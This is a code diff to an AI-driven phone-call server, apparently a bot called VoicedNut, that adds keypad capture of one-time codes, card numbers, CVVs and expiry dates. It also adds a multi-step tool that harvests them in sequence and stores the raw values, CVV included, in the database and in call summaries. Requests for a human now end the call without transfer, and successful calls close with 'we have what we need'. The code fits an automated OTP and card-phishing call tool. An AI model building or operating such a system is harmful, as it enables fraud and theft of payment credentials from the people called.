@@ -79,6 +79,111 @@ function clearDigitTimeout(callSid) {
   }
 }
 
+function clearDigitFallbackState(callSid) {
+  if (digitFallbackStates.has(callSid)) {
+    digitFallbackStates.delete(callSid);
+  }
+}
+
+function clearDigitPlan(callSid) {
+  if (digitCollectionPlans.has(callSid)) {
+    digitCollectionPlans.delete(callSid);
+  }
+}
+
+function clearCallEndLock(callSid) {
+  if (callEndLocks.has(callSid)) {
+    callEndLocks.delete(callSid);
+  }
+}
+
+function clearSilenceTimer(callSid) {
+  const timer = silenceTimers.get(callSid);
+  if (timer) {
+    clearTimeout(timer);
+    silenceTimers.delete(callSid);
+  }
+}
+
+function scheduleSilenceTimer(callSid, timeoutMs = 30000) {
+  if (!callSid) return;
+  if (callEndLocks.has(callSid)) {
+    return;
+  }
+  if (digitCollectionManager.expectations.has(callSid)) {
+    return;
+  }
+  clearSilenceTimer(callSid);
+  const timer = setTimeout(() => {
+    if (!digitCollectionManager.expectations.has(callSid)) {
+      speakAndEndCall(callSid, CALL_END_MESSAGES.no_response, 'silence_timeout');
+    }
+  }, timeoutMs);
+  silenceTimers.set(callSid, timer);
+}
+
+function buildDigitPrompt(expectation) {
+  const min = expectation?.min_digits || 1;
+  const max = expectation?.max_digits || min;
+  const label = min === max ? `${min}-digit` : `${min}-${max} digit`;
+  return expectation?.prompt || `Please enter the ${label} code using your keypad.`;
+}
+
+function buildTwilioStreamTwiml() {
+  const response = new VoiceResponse();
+  const connect = response.connect();
+  connect.stream({ url: `wss://${config.server.hostname}/connection`, track: 'both_tracks' });
+  return response.toString();
+}
+
+function buildTwilioGatherTwiml(callSid, expectation, options = {}) {
+  const response = new VoiceResponse();
+  const min = expectation?.min_digits || 1;
+  const max = expectation?.max_digits || min;
+  const actionUrl = `https://${config.server.hostname}/webhook/twilio-gather?callSid=${encodeURIComponent(callSid)}`;
+  const gather = response.gather({
+    input: 'dtmf',
+    numDigits: max,
+    timeout: Math.max(3, expectation?.timeout_s || 10),
+    action: actionUrl,
+    method: 'POST'
+  });
+  const prompt = options.prompt || buildDigitPrompt(expectation);
+  gather.say(prompt);
+  if (options.followup) {
+    response.say(options.followup);
+  }
+  return response.toString();
+}
+
+async function triggerTwilioGatherFallback(callSid, expectation, options = {}) {
+  if (currentProvider !== 'twilio') return false;
+  if (!config.twilio?.gatherFallback) return false;
+  if (!config.server?.hostname) return false;
+
+  const state = digitFallbackStates.get(callSid);
+  if (state?.active) return false;
+
+  const accountSid = config.twilio.accountSid;
+  const authToken = config.twilio.authToken;
+  if (!accountSid || !authToken) {
+    return false;
+  }
+
+  const client = twilio(accountSid, authToken);
+  const twiml = buildTwilioGatherTwiml(callSid, expectation, options);
+  await client.calls(callSid).update({ twiml });
+
+  digitFallbackStates.set(callSid, {
+    active: true,
+    attempts: (state?.attempts || 0) + 1,
+    lastAt: new Date().toISOString()
+  });
+
+  webhookService.addLiveEvent(callSid, '📟 Using Twilio Gather fallback', { force: true });
+  return true;
+}
+
 function scheduleDigitTimeout(callSid, gptService = null, interactionCount = 0) {
   const exp = digitCollectionManager.expectations.get(callSid);
   if (!exp || !exp.timeout_s) return;
@@ -89,14 +194,52 @@ function scheduleDigitTimeout(callSid, gptService = null, interactionCount = 0) 
     const current = digitCollectionManager.expectations.get(callSid);
     if (!current) return;
 
+    try {
+      await db.addCallDigitEvent({
+        call_sid: callSid,
+        source: 'timeout',
+        profile: current.profile || 'generic',
+        digits: null,
+        len: 0,
+        accepted: false,
+        reason: 'timeout',
+        metadata: {
+          attempt: (current.retries || 0) + 1,
+          max_retries: current.max_retries
+        }
+      });
+    } catch (err) {
+      console.error('Error logging digit timeout:', err);
+    }
+
+    if (!digitFallbackStates.get(callSid)?.active) {
+      try {
+        const usedFallback = await triggerTwilioGatherFallback(callSid, current, {
+          prompt: buildDigitPrompt(current)
+        });
+        if (usedFallback) {
+          return;
+        }
+      } catch (err) {
+        console.error('Twilio gather fallback error:', err);
+      }
+    }
+
     current.retries = (current.retries || 0) + 1;
     digitCollectionManager.expectations.set(callSid, current);
 
+    if (current.retries > current.max_retries) {
+      digitCollectionManager.expectations.delete(callSid);
+      clearDigitTimeout(callSid);
+      clearDigitFallbackState(callSid);
+      clearDigitPlan(callSid);
+      await speakAndEndCall(callSid, CALL_END_MESSAGES.no_response, 'digit_collection_timeout');
+      return;
+    }
+
     const expectedText = `${current.min_digits || ''}${current.max_digits ? `-${current.max_digits}` : ''}`.replace(/-$/, '');
     const expectedLabel = expectedText ? `${expectedText} digit code` : 'the code';
-    const prompt = current.retries > current.max_retries
-      ? 'I could not verify the code. I will connect you to a specialist now.'
-      : `I didn’t catch that. Please re-enter the ${expectedLabel} using your keypad.`;
+    const prompt = `I didn’t catch that. Please re-enter the ${expectedLabel} using your keypad.`;
 
     const personalityInfo = gptService?.personalityEngine?.getCurrentPersonality();
     const reply = {
@@ -114,13 +257,6 @@ function scheduleDigitTimeout(callSid, gptService = null, interactionCount = 0) 
     }
 
     webhookService.addLiveEvent(callSid, `⏳ Awaiting digits retry ${current.retries}/${current.max_retries}`, { force: true });
-
-    if (current.retries > current.max_retries) {
-      digitCollectionManager.expectations.delete(callSid);
-      clearDigitTimeout(callSid);
-      await db.updateCallState(callSid, 'route_requested', { reason: 'digit_collection_timeout', via: 'auto' }).catch(() => {});
-      return;
-    }
 
     scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
   }, (exp.timeout_s || 20) * 1000);
@@ -244,6 +380,124 @@ const callConfigurations = new Map();
 const activeCalls = new Map();
 const callFunctionSystems = new Map(); // Store generated functions per call
 const digitTimeouts = new Map();
+const digitFallbackStates = new Map();
+const digitCollectionPlans = new Map();
+const callEndLocks = new Map();
+const silenceTimers = new Map();
+
+const DIGIT_PROFILE_DEFAULTS = {
+  verification: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, prompt: 'Please enter the verification code using your keypad.' },
+  otp: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, prompt: 'Please enter the one-time code on your keypad.' },
+  cvv: { min_digits: 3, max_digits: 4, timeout_s: 12, max_retries: 2, prompt: 'Enter the 3 or 4 digit security code using your keypad.' },
+  card_number: { min_digits: 13, max_digits: 19, timeout_s: 25, max_retries: 2, confirmation_style: 'last4', prompt: 'Please enter the card number using your keypad.' },
+  card_expiry: { min_digits: 4, max_digits: 6, timeout_s: 20, max_retries: 2, prompt: 'Enter the card expiry as MMYY (or MMYYYY) on your keypad.' },
+  zip: { min_digits: 5, max_digits: 9, timeout_s: 15, max_retries: 2, prompt: 'Please enter the ZIP code using your keypad.' },
+  extension: { min_digits: 1, max_digits: 6, timeout_s: 10, max_retries: 2, prompt: 'Enter the extension using your keypad.' }
+};
+
+const CALL_END_MESSAGES = {
+  success: 'Thanks, we have what we need. Goodbye.',
+  failure: 'We could not verify the information provided. Thank you for your time. Goodbye.',
+  no_response: 'We did not receive a response. Thank you and goodbye.',
+  user_goodbye: 'Thanks for your time. Goodbye.',
+  error: 'I am having trouble right now. Thank you and goodbye.'
+};
+
+function getDigitProfileDefaults(profile = 'generic') {
+  const key = String(profile || 'generic').toLowerCase();
+  return DIGIT_PROFILE_DEFAULTS[key] || {};
+}
+
+function normalizeDigitExpectation(params = {}) {
+  const profile = String(params.profile || 'generic').toLowerCase();
+  const defaults = getDigitProfileDefaults(profile);
+  const minDigits = typeof params.min_digits === 'number'
+    ? params.min_digits
+    : (typeof defaults.min_digits === 'number' ? defaults.min_digits : 1);
+  const maxDigits = typeof params.max_digits === 'number'
+    ? params.max_digits
+    : (typeof defaults.max_digits === 'number' ? defaults.max_digits : minDigits);
+  const timeout = typeof params.timeout_s === 'number'
+    ? params.timeout_s
+    : (typeof defaults.timeout_s === 'number' ? defaults.timeout_s : 20);
+  const maxRetries = typeof params.max_retries === 'number'
+    ? params.max_retries
+    : (typeof defaults.max_retries === 'number' ? defaults.max_retries : 2);
+  const maskForGpt = typeof params.mask_for_gpt === 'boolean'
+    ? params.mask_for_gpt
+    : (typeof defaults.mask_for_gpt === 'boolean' ? defaults.mask_for_gpt : true);
+  const speakConfirmation = typeof params.speak_confirmation === 'boolean' ? params.speak_confirmation : false;
+  const confirmationStyle = params.confirmation_style || defaults.confirmation_style || 'none';
+  const prompt = params.prompt && String(params.prompt).trim().length > 0
+    ? params.prompt
+    : (defaults.prompt || 'Please enter the digits now.');
+
+  return {
+    prompt,
+    profile,
+    min_digits: minDigits,
+    max_digits: maxDigits < minDigits ? minDigits : maxDigits,
+    timeout_s: timeout,
+    max_retries: maxRetries,
+    menu_options: params.menu_options || [],
+    confirmation_style: confirmationStyle,
+    allow_spoken_fallback: params.allow_spoken_fallback !== false,
+    mask_for_gpt: maskForGpt,
+    speak_confirmation: speakConfirmation
+  };
+}
+
+function isValidLuhn(value = '') {
+  const digits = String(value || '').replace(/\D/g, '');
+  if (!digits) return false;
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = digits.length - 1; i >= 0; i -= 1) {
+    let digit = Number(digits[i]);
+    if (Number.isNaN(digit)) return false;
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+  return sum % 10 === 0;
+}
+
+function validateProfileDigits(profile = 'generic', digits = '') {
+  const value = String(digits || '');
+  if (!value) {
+    return { valid: false, reason: 'empty' };
+  }
+
+  switch (String(profile || '').toLowerCase()) {
+    case 'cvv':
+      if (value.length === 3 || value.length === 4) {
+        return { valid: true };
+      }
+      return { valid: false, reason: 'invalid_cvv' };
+    case 'card_number':
+      if (value.length < 13 || value.length > 19) {
+        return { valid: false, reason: 'invalid_card_length' };
+      }
+      return isValidLuhn(value)
+        ? { valid: true }
+        : { valid: false, reason: 'invalid_card_number' };
+    case 'card_expiry': {
+      if (value.length !== 4 && value.length !== 6) {
+        return { valid: false, reason: 'invalid_expiry_length' };
+      }
+      const month = Number(value.slice(0, 2));
+      if (!month || month < 1 || month > 12) {
+        return { valid: false, reason: 'invalid_expiry_month' };
+      }
+      return { valid: true };
+    }
+    default:
+      return { valid: true };
+  }
+}
 
 let db;
 const functionEngine = new DynamicFunctionEngine();
@@ -253,17 +507,12 @@ const smsService = new EnhancedSmsService();
 const digitCollectionManager = {
   expectations: new Map(), // callSid -> expectation
   setExpectation(callSid, params = {}) {
+    const normalized = normalizeDigitExpectation(params);
     this.expectations.set(callSid, {
-      profile: params.profile || 'generic',
-      min_digits: params.min_digits || 1,
-      max_digits: params.max_digits || params.min_digits || 6,
-      timeout_s: params.timeout_s || 20,
-      max_retries: params.max_retries || 2,
-      menu_options: params.menu_options || [],
-      confirmation_style: params.confirmation_style || 'none',
-      allow_spoken_fallback: params.allow_spoken_fallback !== false,
-      mask_for_gpt: params.mask_for_gpt !== false,
-      speak_confirmation: params.speak_confirmation || false,
+      ...normalized,
+      plan_id: params.plan_id || null,
+      plan_step_index: Number.isFinite(params.plan_step_index) ? params.plan_step_index : null,
+      plan_total_steps: Number.isFinite(params.plan_total_steps) ? params.plan_total_steps : null,
       retries: 0,
       buffer: '',
       collected: [],
@@ -295,25 +544,38 @@ const digitCollectionManager = {
     }
 
     exp.buffer = `${exp.buffer || ''}${String(digits)}`;
-    const len = exp.buffer.length;
+    const currentBuffer = exp.buffer;
+    const len = currentBuffer.length;
     const inRange = len >= exp.min_digits && len <= exp.max_digits;
     const tooLong = len > exp.max_digits;
-    const masked = len <= 4 ? exp.buffer : `${'*'.repeat(Math.max(0, len - 4))}${exp.buffer.slice(-4)}`;
+    const masked = len <= 4 ? currentBuffer : `${'*'.repeat(Math.max(0, len - 4))}${currentBuffer.slice(-4)}`;
 
-    Object.assign(result, {
-      digits: exp.buffer,
-      len,
-      masked,
-      accepted: inRange && !tooLong
-    });
+    let accepted = inRange && !tooLong;
+    let reason = null;
 
     if (tooLong) {
-      result.accepted = false;
-      result.reason = 'too_long';
+      accepted = false;
+      reason = 'too_long';
       exp.buffer = '';
-    } else if (!result.accepted) {
-      result.reason = 'incomplete';
+    } else if (!inRange) {
+      accepted = false;
+      reason = 'incomplete';
+    } else {
+      const validation = validateProfileDigits(exp.profile, currentBuffer);
+      if (!validation.valid) {
+        accepted = false;
+        reason = validation.reason || 'invalid';
+        exp.buffer = '';
+      }
     }
+
+    Object.assign(result, {
+      digits: currentBuffer,
+      len,
+      masked,
+      accepted,
+      reason
+    });
 
     exp.collected.push(result.digits);
     exp.last_masked = masked;
@@ -321,7 +583,7 @@ const digitCollectionManager = {
     if (result.accepted) {
       // reset buffer after successful collection
       exp.buffer = '';
-    } else if (result.reason !== 'incomplete') {
+    } else if (result.reason && result.reason !== 'incomplete') {
       exp.retries += 1;
       result.retries = exp.retries;
       if (exp.retries > exp.max_retries) {
@@ -334,8 +596,9 @@ const digitCollectionManager = {
   }
 };
 
-async function handleCollectionResult(callSid, collection, gptService = null, interactionCount = 0) {
+async function handleCollectionResult(callSid, collection, gptService = null, interactionCount = 0, source = 'dtmf', options = {}) {
   if (!collection) return;
+  const allowCallEnd = options.allowCallEnd !== false;
   const expectation = digitCollectionManager.expectations.get(callSid);
   const expectedText = expectation ? `${expectation.min_digits || ''}${expectation.max_digits ? `-${expectation.max_digits}` : ''}`.replace(/-$/, '') : '';
   const expectedLabel = expectedText ? `${expectedText} digit code` : 'the code';
@@ -355,6 +618,19 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
     await db.updateCallState(callSid, 'digits_collected', {
       ...payload,
       masked_last4: collection.masked
+    });
+    await db.addCallDigitEvent({
+      call_sid: callSid,
+      source,
+      profile: collection.profile,
+      digits: collection.digits,
+      len: collection.len,
+      accepted: collection.accepted,
+      reason: collection.reason,
+      metadata: {
+        masked: collection.masked,
+        route: collection.route || null
+      }
     });
   } catch (err) {
     console.error('Error logging digits_collected:', err);
@@ -382,6 +658,7 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
 
   if (collection.accepted) {
     clearDigitTimeout(callSid);
+    clearDigitFallbackState(callSid);
     digitCollectionManager.expectations.delete(callSid);
     switch (collection.profile) {
       case 'menu':
@@ -422,27 +699,85 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
           raw_digits: collection.digits
         }).catch(() => {});
         break;
+      case 'card_number':
+        webhookService.addLiveEvent(callSid, `💳 Card number captured (${collection.len})`, { force: true });
+        await db.updateCallState(callSid, 'card_number_captured', {
+          card_number: collection.digits,
+          last4: collection.digits ? collection.digits.slice(-4) : null
+        }).catch(() => {});
+        break;
+      case 'cvv':
+        webhookService.addLiveEvent(callSid, `🔐 CVV captured (${collection.len})`, { force: true });
+        await db.updateCallState(callSid, 'cvv_captured', {
+          cvv: collection.digits
+        }).catch(() => {});
+        break;
+      case 'card_expiry':
+        webhookService.addLiveEvent(callSid, `📅 Expiry captured (${collection.digits})`, { force: true });
+        await db.updateCallState(callSid, 'card_expiry_captured', {
+          expiry: collection.digits
+        }).catch(() => {});
+        break;
       default:
         webhookService.addLiveEvent(callSid, `🔢 Digits captured (${collection.len})`, { force: true });
     }
-    emitReply('Thanks, I received your code. One moment while I continue.');
+    const planId = expectation?.plan_id;
+    if (planId && digitCollectionPlans.has(callSid)) {
+      const plan = digitCollectionPlans.get(callSid);
+      if (plan?.id === planId && plan.active) {
+        plan.index += 1;
+        if (plan.index < plan.steps.length) {
+          await startNextDigitPlanStep(callSid, plan, gptService, interactionCount + 1);
+          return;
+        }
+        plan.active = false;
+        digitCollectionPlans.delete(callSid);
+        webhookService.addLiveEvent(callSid, '✅ Digit collection plan completed', { force: true });
+        await db.updateCallState(callSid, 'digit_collection_plan_completed', {
+          steps: plan.steps.length,
+          completed_at: new Date().toISOString()
+        }).catch(() => {});
+      }
+    }
+
+    if (allowCallEnd) {
+      await speakAndEndCall(callSid, CALL_END_MESSAGES.success, 'digits_collected');
+      return;
+    }
   } else {
-    webhookService.addLiveEvent(callSid, `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`, { force: true });
+    const reasonHint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
+    webhookService.addLiveEvent(callSid, `⚠️ Invalid digits (${collection.len})${reasonHint}; retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`, { force: true });
     if (collection.fallback) {
-      webhookService.addLiveEvent(callSid, `⏳ No valid digits; consider fallback/transfer`, { force: true });
+      webhookService.addLiveEvent(callSid, `⏳ No valid digits; ending call`, { force: true });
       digitCollectionManager.expectations.delete(callSid);
       clearDigitTimeout(callSid);
-      emitReply('I could not verify the code. I will connect you to a specialist now.');
-      await db.updateCallState(callSid, 'route_requested', { reason: 'digit_collection_failed', via: 'auto' }).catch(() => {});
+      clearDigitFallbackState(callSid);
+      clearDigitPlan(callSid);
+      if (allowCallEnd) {
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.failure, 'digit_collection_failed');
+        return;
+      }
+      emitReply('I could not verify the code. Thank you for your time.');
     } else {
-      const prompts = [
-        `That did not go through. Please re-enter the ${expectedLabel} using your keypad.`,
-        `I could not read that. Enter the ${expectedLabel} again on your keypad, please.`,
-        `Let’s try once more—type the ${expectedLabel} on your keypad now.`
-      ];
-      const prompt = prompts[Math.floor(Math.random() * prompts.length)];
+      let prompt = '';
+      if (collection.profile === 'card_number') {
+        prompt = 'That card number did not go through. Please re-enter the card number using your keypad.';
+      } else if (collection.profile === 'cvv') {
+        prompt = 'That security code did not go through. Please enter the 3 or 4 digit CVV using your keypad.';
+      } else if (collection.profile === 'card_expiry') {
+        prompt = 'That expiry date did not go through. Please enter it as MMYY (or MMYYYY) using your keypad.';
+      } else {
+        const prompts = [
+          `That did not go through. Please re-enter the ${expectedLabel} using your keypad.`,
+          `I could not read that. Enter the ${expectedLabel} again on your keypad, please.`,
+          `Let’s try once more—type the ${expectedLabel} on your keypad now.`
+        ];
+        prompt = prompts[Math.floor(Math.random() * prompts.length)];
+      }
       emitReply(prompt);
-      scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
+      if (gptService) {
+        scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
+      }
     }
   }
 
@@ -455,6 +790,45 @@ async function handleCollectionResult(callSid, collection, gptService = null, in
       ? `⚠️ Digits failed after retries`
       : `⚠️ Invalid digits (${collection.len}); retry ${collection.retries}/${digitCollectionManager.expectations.get(callSid)?.max_retries || 0}`;
   webhookService.addLiveEvent(callSid, summary, { force: true });
+}
+
+async function startNextDigitPlanStep(callSid, plan, gptService = null, interactionCount = 0) {
+  if (!plan || !Array.isArray(plan.steps) || plan.index >= plan.steps.length) return;
+  const step = plan.steps[plan.index];
+  const payload = normalizeDigitExpectation(step);
+  payload.plan_id = plan.id;
+  payload.plan_step_index = plan.index + 1;
+  payload.plan_total_steps = plan.steps.length;
+
+  digitCollectionManager.setExpectation(callSid, payload);
+  clearSilenceTimer(callSid);
+  if (gptService) {
+    scheduleDigitTimeout(callSid, gptService, interactionCount);
+  }
+
+  try {
+    await db.updateCallState(callSid, 'digit_collection_requested', payload);
+  } catch (err) {
+    console.error('digit plan step updateCallState error:', err);
+  }
+
+  const stepLabel = payload.profile || 'digits';
+  webhookService.addLiveEvent(callSid, `🔢 Collect digits (${stepLabel}) step ${payload.plan_step_index}/${payload.plan_total_steps}`, { force: true });
+
+  if (gptService) {
+    const instruction = payload.plan_total_steps
+      ? `Step ${payload.plan_step_index} of ${payload.plan_total_steps}. Please enter the ${payload.min_digits}-${payload.max_digits} digit code using your keypad. I will not repeat it back. ${payload.prompt}`
+      : `Please enter the ${payload.min_digits}-${payload.max_digits} digit code using your keypad. I will not repeat it back. ${payload.prompt}`;
+    gptService.emit('gptreply', {
+      partialResponseIndex: null,
+      partialResponse: instruction,
+      personalityInfo: gptService.personalityEngine.getCurrentPersonality(),
+      adaptationHistory: gptService.personalityChanges?.slice(-3) || []
+    }, interactionCount);
+    try {
+      gptService.updateUserContext('digit_collection_plan', 'system', `Digit plan step ${payload.plan_step_index}/${payload.plan_total_steps} (${payload.profile})`);
+    } catch (_) {}
+  }
 }
 
 // Built-in telephony function templates to give GPT deterministic controls
@@ -478,7 +852,7 @@ const telephonyTools = [
     type: 'function',
     function: {
       name: 'route_to_agent',
-      description: 'Escalate or transfer the call to a human/agent queue.',
+      description: 'End the call politely (no transfer) when escalation is requested.',
       parameters: {
         type: 'object',
         properties: {
@@ -500,7 +874,7 @@ const telephonyTools = [
           prompt: { type: 'string', description: 'Short instruction to the caller.' },
           min_digits: { type: 'integer', description: 'Minimum digits expected.', minimum: 1 },
           max_digits: { type: 'integer', description: 'Maximum digits expected.', minimum: 1 },
-          profile: { type: 'string', enum: ['generic', 'verification', 'menu', 'account', 'extension', 'zip', 'amount', 'survey', 'callback_confirm'], description: 'Collection profile for downstream handling.' },
+          profile: { type: 'string', enum: ['generic', 'verification', 'menu', 'account', 'extension', 'zip', 'amount', 'survey', 'callback_confirm', 'card_number', 'cvv', 'card_expiry'], description: 'Collection profile for downstream handling.' },
           menu_options: { type: 'array', description: 'For menu profile, array of {digit,label,route}.', items: { type: 'object', properties: { digit: { type: 'string' }, label: { type: 'string' }, route: { type: 'string' } } } },
           confirmation_style: { type: 'string', enum: ['none', 'last4', 'spoken_amount'], description: 'How to confirm receipt (masked, spoken summary only).' },
           timeout_s: { type: 'integer', description: 'Timeout in seconds before reprompt.', minimum: 3 },
@@ -510,6 +884,40 @@ const telephonyTools = [
           speak_confirmation: { type: 'boolean', description: 'If true, GPT can verbally confirm receipt (without echoing digits).' }
         },
         required: ['prompt', 'min_digits', 'max_digits']
+      }
+    }
+  },
+  {
+    type: 'function',
+    function: {
+      name: 'collect_multiple_digits',
+      description: 'Collect multiple digit profiles sequentially in a single call (e.g., card number, expiry, CVV, ZIP). Do not repeat digits.',
+      parameters: {
+        type: 'object',
+        properties: {
+          steps: {
+            type: 'array',
+            description: 'Ordered list of digit collection steps.',
+            items: {
+              type: 'object',
+              properties: {
+                prompt: { type: 'string', description: 'Short instruction to the caller.' },
+                min_digits: { type: 'integer', description: 'Minimum digits expected.', minimum: 1 },
+                max_digits: { type: 'integer', description: 'Maximum digits expected.', minimum: 1 },
+                profile: { type: 'string', enum: ['generic', 'verification', 'menu', 'account', 'extension', 'zip', 'amount', 'survey', 'callback_confirm', 'card_number', 'cvv', 'card_expiry'], description: 'Collection profile for downstream handling.' },
+                menu_options: { type: 'array', description: 'For menu profile, array of {digit,label,route}.', items: { type: 'object', properties: { digit: { type: 'string' }, label: { type: 'string' }, route: { type: 'string' } } } },
+                confirmation_style: { type: 'string', enum: ['none', 'last4', 'spoken_amount'], description: 'How to confirm receipt (masked, spoken summary only).' },
+                timeout_s: { type: 'integer', description: 'Timeout in seconds before reprompt.', minimum: 3 },
+                max_retries: { type: 'integer', description: 'Number of retries before fallback.', minimum: 0 },
+                allow_spoken_fallback: { type: 'boolean', description: 'If true, allow spoken fallback after keypad timeout.' },
+                mask_for_gpt: { type: 'boolean', description: 'If true (default), mask digits before sending to GPT/transcripts.' },
+                speak_confirmation: { type: 'boolean', description: 'If true, GPT can verbally confirm receipt (without echoing digits).' }
+              },
+              required: ['profile']
+            }
+          }
+        },
+        required: ['steps']
       }
     }
   },
@@ -552,31 +960,23 @@ function buildTelephonyImplementations(callSid, gptService = null) {
         priority: args.priority || 'normal'
       };
       try {
-        await db.updateCallState(callSid, 'route_requested', payload);
-        webhookService.addLiveEvent(callSid, `📞 Routing to agent: ${payload.reason}`, { force: true });
+        webhookService.addLiveEvent(callSid, `📞 Transfer requested (${payload.reason}) • ending call`, { force: true });
+        await speakAndEndCall(callSid, CALL_END_MESSAGES.failure, 'transfer_requested');
       } catch (err) {
         console.error('route_to_agent handler error:', err);
       }
       return payload;
     },
     collect_digits: async (args = {}) => {
-      const payload = {
-        prompt: args.prompt || 'Please enter the digits now.',
-        min_digits: args.min_digits || 1,
-        max_digits: args.max_digits || args.min_digits || 6,
-        profile: args.profile || 'generic',
-        menu_options: args.menu_options || [],
-        confirmation_style: args.confirmation_style || 'none',
-        timeout_s: args.timeout_s || 20,
-        max_retries: typeof args.max_retries === 'number' ? args.max_retries : 2,
-        allow_spoken_fallback: args.allow_spoken_fallback !== false,
-        mask_for_gpt: args.mask_for_gpt !== false,
-        speak_confirmation: !!args.speak_confirmation
-      };
+      if (digitCollectionPlans.has(callSid)) {
+        clearDigitPlan(callSid);
+      }
+      const payload = normalizeDigitExpectation(args);
       try {
         await db.updateCallState(callSid, 'digit_collection_requested', payload);
         webhookService.addLiveEvent(callSid, `🔢 Collect digits (${payload.profile}): ${payload.min_digits}-${payload.max_digits}`, { force: true });
         digitCollectionManager.setExpectation(callSid, payload);
+        clearSilenceTimer(callSid);
         scheduleDigitTimeout(callSid, gptService, 0);
         if (gptService) {
           const instruction = `Please enter the ${payload.min_digits}-${payload.max_digits} digit code using your keypad. I will not repeat it back. ${payload.prompt}`;
@@ -593,6 +993,36 @@ function buildTelephonyImplementations(callSid, gptService = null) {
         console.error('collect_digits handler error:', err);
       }
       return payload;
+    },
+    collect_multiple_digits: async (args = {}) => {
+      const steps = Array.isArray(args.steps) ? args.steps : [];
+      if (!steps.length) {
+        return { error: 'No steps provided' };
+      }
+
+      if (digitCollectionPlans.has(callSid)) {
+        clearDigitPlan(callSid);
+      }
+      digitCollectionManager.expectations.delete(callSid);
+      clearDigitTimeout(callSid);
+      clearDigitFallbackState(callSid);
+
+      const plan = {
+        id: `plan_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`,
+        steps,
+        index: 0,
+        active: true,
+        created_at: new Date().toISOString()
+      };
+
+      digitCollectionPlans.set(callSid, plan);
+      await db.updateCallState(callSid, 'digit_collection_plan_started', {
+        steps: steps.map((step) => step.profile || 'generic'),
+        total_steps: steps.length
+      }).catch(() => {});
+
+      await startNextDigitPlanStep(callSid, plan, gptService, 0);
+      return { status: 'started', steps: steps.length };
     },
     play_disclosure: async (args = {}) => {
       const payload = { message: args.message || '' };
@@ -630,6 +1060,76 @@ function buildRecapSmsBody(call) {
   const rawSummary = (call.call_summary || '').replace(/\s+/g, ' ').trim();
   const summary = rawSummary ? rawSummary.slice(0, 180) : 'Call finished.';
   return `VoicedNut call recap${name}: ${summary} Status: ${status}.${duration}`;
+}
+
+const DIGIT_PROFILE_LABELS = {
+  verification: 'OTP',
+  otp: 'OTP',
+  account: 'Account',
+  zip: 'ZIP',
+  extension: 'Ext',
+  amount: 'Amount',
+  survey: 'Survey',
+  callback_confirm: 'Callback',
+  card_number: 'Card',
+  cvv: 'CVV',
+  card_expiry: 'Expiry',
+  menu: 'Menu',
+  generic: 'Digits'
+};
+
+function buildDigitSummary(digitEvents = []) {
+  if (!Array.isArray(digitEvents) || digitEvents.length === 0) {
+    return { summary: '', count: 0 };
+  }
+
+  const grouped = new Map();
+  for (const event of digitEvents) {
+    const profile = event.profile || 'generic';
+    if (!grouped.has(profile)) {
+      grouped.set(profile, []);
+    }
+    grouped.get(profile).push(event);
+  }
+
+  const parts = [];
+  let acceptedCount = 0;
+
+  for (const [profile, events] of grouped.entries()) {
+    const acceptedEvents = events.filter((e) => e.accepted);
+    const chosen = acceptedEvents.length ? acceptedEvents[acceptedEvents.length - 1] : events[events.length - 1];
+    const label = DIGIT_PROFILE_LABELS[profile] || profile;
+    let value = chosen.digits || '';
+
+    if (profile === 'amount' && value) {
+      const cents = Number(value);
+      if (!Number.isNaN(cents)) {
+        value = `$${(cents / 100).toFixed(2)}`;
+      }
+    }
+    if (profile === 'card_expiry' && value) {
+      if (value.length === 4) {
+        value = `${value.slice(0, 2)}/${value.slice(2)}`;
+      } else if (value.length === 6) {
+        value = `${value.slice(0, 2)}/${value.slice(2)}`;
+      }
+    }
+
+    if (!value) {
+      value = 'none';
+    }
+
+    const suffix = chosen.accepted ? '' : ' (unverified)';
+    if (chosen.accepted) {
+      acceptedCount += 1;
+    }
+    parts.push(`${label}: ${value}${suffix}`);
+  }
+
+  return {
+    summary: parts.join(' • '),
+    count: acceptedCount
+  };
 }
 
 const OTP_REGEX = /\b\d{4,8}\b/g;
@@ -716,11 +1216,16 @@ function getOtpContext(text = '', callSid = null) {
   }
   const expectation = callSid ? digitCollectionManager.expectations.get(callSid) : null;
   const maskForGpt = expectation ? expectation.mask_for_gpt !== false : true;
-  const numericCodes = [...text.matchAll(OTP_REGEX)].map((m) => m[0]);
-  const spokenCodes = extractSpokenDigitSequences(text).filter((code) => code.length >= 4 && code.length <= 8);
+  const minExpected = typeof expectation?.min_digits === 'number' ? expectation.min_digits : 4;
+  const maxExpected = typeof expectation?.max_digits === 'number' ? expectation.max_digits : 8;
+  const dynamicRegex = expectation
+    ? new RegExp(`\\b\\d{${minExpected},${maxExpected}}\\b`, 'g')
+    : OTP_REGEX;
+  const numericCodes = [...text.matchAll(dynamicRegex)].map((m) => m[0]);
+  const spokenCodes = extractSpokenDigitSequences(text).filter((code) => code.length >= minExpected && code.length <= maxExpected);
   const codes = [...numericCodes, ...spokenCodes];
   const otpDetected = codes.length > 0;
-  const masked = text.replace(OTP_REGEX, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
+  const masked = text.replace(dynamicRegex, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
   return {
     raw: text,
     maskedForGpt: maskForGpt ? masked : text,
@@ -841,6 +1346,108 @@ async function endCallForProvider(callSid) {
   throw new Error(`Unsupported provider ${provider}`);
 }
 
+function estimateSpeechDurationMs(text = '') {
+  const words = String(text || '').trim().split(/\s+/).filter(Boolean).length;
+  const baseMs = 1200;
+  const perWordMs = 420;
+  const estimated = baseMs + (words * perWordMs);
+  return Math.max(1600, Math.min(12000, estimated));
+}
+
+async function speakAndEndCall(callSid, message, reason = 'completed') {
